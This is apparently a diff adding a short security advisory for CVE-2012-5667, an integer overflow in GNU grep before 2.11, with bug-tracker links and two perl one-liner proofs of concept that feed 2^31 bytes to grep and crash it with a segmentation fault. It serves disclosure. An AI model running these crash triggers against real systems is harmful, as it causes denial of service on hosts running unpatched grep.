@@ -1,0 +1,41 @@
+Grep <2.11 is vulnerable to int overflow exploitation.
+
+http://lists.gnu.org/archive/html/bug-grep/2012-03/msg00007.html
+
+Although it is patched in the recent Grep,
+This update has not been pushed to the Ubuntu repos, or the Redhat
+repos, leaving 99% of those OS's(and more) vulnerable.
+
+
+There are also many other ways to do this bug.
+
+It is low severity because it would be extremely hard to actually
+exploit it, and it is a local exploit, and it is not run by root.
+
+Found By: Security Researcher - Joshua Rogers
+
+
+More:
+https://bugzilla.redhat.com/show_bug.cgi?id=889935
+https://bugs.launchpad.net/ubuntu/+source/grep/+bug/1091473
+http://seclists.org/oss-sec/2012/q4/504
+etc.
+
+#There are many ways of doing this.
+
+#Method one:
+$ perl -e 'print "x"x(2**31)' | grep x > /dev/null
+Segmentation fault (core dumped)
+
+
+#Method two:
+$ perl -e 'print "\nx"x(2**31)' | grep -c x > /dev/null
+
+
+Twitter: https://twitter.com/MegaManSec
+
+
+CVE: CVE-2012-5667
+-- 
+*Joshua Rogers* - Retro Game Collector && IT Security Specialist
+gpg pubkey <http://www.internot.info/docs/gpg_pubkey.asc.gpg>
